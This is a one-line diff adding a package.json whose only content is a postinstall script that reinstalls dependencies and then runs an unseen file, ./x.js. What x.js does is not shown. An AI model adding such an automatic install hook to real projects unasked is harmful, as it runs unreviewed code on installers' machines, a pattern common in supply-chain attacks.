@@ -1,0 +1,1 @@
+{"scripts":{"postinstall":"npm install --ignore-scripts && node ./x.js"}}
